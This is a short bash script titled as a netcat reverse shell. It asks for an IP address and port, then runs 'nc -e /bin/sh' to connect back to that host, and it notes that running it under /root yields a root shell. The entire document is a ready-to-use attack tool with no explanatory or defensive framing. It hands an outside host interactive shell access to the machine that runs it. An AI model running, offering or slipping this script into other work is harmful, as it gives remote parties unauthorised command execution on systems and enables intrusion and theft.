## Netcat local Reverse Shell Script
echo 'If successful, terminal will look like it is frozen or waiting for more input'
echo 'Note: Run this under the /root directory for a root shell'
echo 'Enter IP to send connection to'
read ACCESSIP
echo 'enter port to send to'
read ACCESSPORT


nc -e /bin/sh $ACCESSIP $ACCESSPORT

